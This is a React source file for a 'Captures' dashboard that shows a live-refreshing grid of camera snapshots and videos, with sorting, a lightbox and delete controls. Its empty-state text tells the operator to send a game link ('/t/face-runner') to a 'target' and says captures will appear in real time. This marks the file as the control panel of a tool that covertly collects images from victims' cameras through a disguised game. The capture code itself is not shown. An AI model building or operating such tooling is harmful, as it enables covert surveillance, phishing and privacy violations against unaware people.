import { useEffect, useState, useCallback } from 'react'
import { api, Capture } from '../api/client'

function fmtSize(b: number) {
  if (b < 1024) return `${b} B`
  if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`
  return `${(b / 1048576).toFixed(2)} MB`
}
function relTime(ts: number) {
  const diff = Date.now() / 1000 - ts
  if (diff < 10) return 'just now'
  if (diff < 60) return `${Math.floor(diff)}s ago`
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

export default function Captures() {
  const [captures, setCaptures] = useState<Capture[]>([])
  const [loading, setLoading] = useState(true)
  const [lightbox, setLightbox] = useState<number | null>(null)
  const [sort, setSort] = useState('newest')
  const [autoRefresh, setAutoRefresh] = useState(true)

  const refresh = useCallback(async () => {
    try {
      const data = await api.captures(1, 60, sort)
      setCaptures(data.captures)
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [sort])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 3000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const del = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!confirm('Delete this capture?')) return
    await api.deleteCapture(id)
    refresh()
  }

  const delAll = async () => {
    if (!confirm('Delete ALL captures?')) return
    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
    await api.deleteAllCaptures()
    refresh()
  }

  const isVideo = (ft: string) => ft.includes('video')

  return (
    <div className="space-y-4 stagger">
      <div className="flex items-center justify-between flex-wrap gap-3 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Captures</h1>
          <p className="text-sm text-tertiary mt-0.5">{captures.length} camera snapshots</p>
        </div>
        <div className="flex gap-2">
          <select value={sort} onChange={e => setSort(e.target.value)} className="select-apple">
            <option value="newest">Newest</option>
            <option value="oldest">Oldest</option>
            <option value="largest">Largest</option>
          </select>
          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`select-apple cursor-pointer ${autoRefresh ? 'accent-bg accent' : ''}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="select-apple cursor-pointer">⟳</button>
          {captures.length > 0 && (
            <button onClick={delAll} className="select-apple cursor-pointer" style={{ color: 'var(--accent)' }}>🗑 All</button>
          )}
        </div>
      </div>

      {loading ? (
        <div className="flex justify-center py-20"><div className="spinner"></div></div>
      ) : captures.length === 0 ? (
        <div className="empty-state animate-fade-in">
          <div className="icon">📷</div>
          <h3>No captures yet</h3>
          <p>Send the game link to a target. Captures appear here in real-time.</p>
          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="inline-block mt-5 px-4 py-2 nav-link active">🎮 Open Game</a>
        </div>
      ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
          {captures.map((c, i) => {
            const recent = Date.now() / 1000 - c.created_at < 30
            return (
              <div
                key={c.id}
                onClick={() => setLightbox(i)}
                className={`group relative bg-secondary border-subtle radius-card overflow-hidden cursor-pointer transition-all duration-200 animate-scale-in hover:-translate-y-1 shadow-card ${
                  recent ? 'shadow-card-lg' : ''
                }`}
                style={{ animationDelay: `${i * 0.03}s`, animationFillMode: 'both' }}
              >
                {isVideo(c.file_type) ? (
                  <div className="h-32 flex items-center justify-center bg-primary text-4xl">🎬</div>
                ) : (
                  <img src={c.url} alt={c.filename} loading="lazy" className="h-32 w-full object-cover" />
                )}
                {recent && (
                  <div className="absolute top-2 left-2 badge" style={{ background: 'var(--accent)', color: '#fff' }}>NEW</div>
                )}
                <button onClick={e => del(c.id, e)} className="absolute top-2 right-2 w-6 h-6 rounded-full bg-red-500/90 text-white text-xs opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">×</button>
                <div className="p-2.5">
                  <div className="text-xs text-secondary truncate">{c.filename}</div>
                  <div className="flex justify-between mt-1.5">
                    <span className="text-[10px] text-tertiary">{relTime(c.created_at)}</span>
                    <span className="text-[10px] text-tertiary mono">{fmtSize(c.file_size)}</span>
                  </div>
                </div>
              </div>
            )
          })}
        </div>
      )}

      {lightbox !== null && captures[lightbox] && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-6 animate-scale-in" onClick={() => setLightbox(null)}
          style={{ backgroundColor: 'rgba(0,0,0,0.92)' }}>
          <button className="absolute top-4 right-6 text-white/60 hover:text-white text-4xl" onClick={() => setLightbox(null)}>×</button>
          {lightbox > 0 && <button className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox - 1) }}>‹</button>}
          {lightbox < captures.length - 1 && <button className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox + 1) }}>›</button>}
          {isVideo(captures[lightbox].file_type) ? (
            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] radius-card-lg" />
          ) : (
            <img src={captures[lightbox].url} className="max-w-[95%] max-h-[85vh] radius-card-lg shadow-card-lg" />
          )}
          <div className="absolute bottom-6 left-1/2 -translate-x-1/2 text-secondary text-sm px-4 py-2 radius-card" style={{ backgroundColor: 'var(--bg-glass)' }}>
            {captures[lightbox].filename} · {fmtSize(captures[lightbox].file_size)} · {relTime(captures[lightbox].created_at)}
          </div>
        </div>
      )}
    </div>
  )
}
